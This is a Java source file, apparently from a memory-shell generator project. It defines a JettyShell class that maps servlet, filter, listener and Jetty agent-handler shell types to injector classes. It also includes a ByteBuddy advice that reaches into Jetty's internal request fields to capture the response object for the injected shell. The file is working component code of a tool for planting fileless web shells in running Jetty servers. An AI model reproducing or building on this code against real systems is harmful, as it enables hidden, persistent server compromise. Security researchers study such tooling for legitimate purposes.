package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.jetty.JettyFilterInjector;
import com.reajason.javaweb.memshell.injector.jetty.JettyHandlerAgentInjector;
import com.reajason.javaweb.memshell.injector.jetty.JettyListenerInjector;
import com.reajason.javaweb.memshell.injector.jetty.JettyServletInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public class JettyShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_channel"), "_response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connection"), "_response");
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, JettyServletInjector.class)
                .addInjector(JAKARTA_SERVLET, JettyServletInjector.class)
                .addInjector(FILTER, JettyFilterInjector.class)
                .addInjector(JAKARTA_FILTER, JettyFilterInjector.class)
                .addInjector(LISTENER, JettyListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, JettyListenerInjector.class)
                .addInjector(JETTY_AGENT_HANDLER, JettyHandlerAgentInjector.class)
                .build();
    }
}
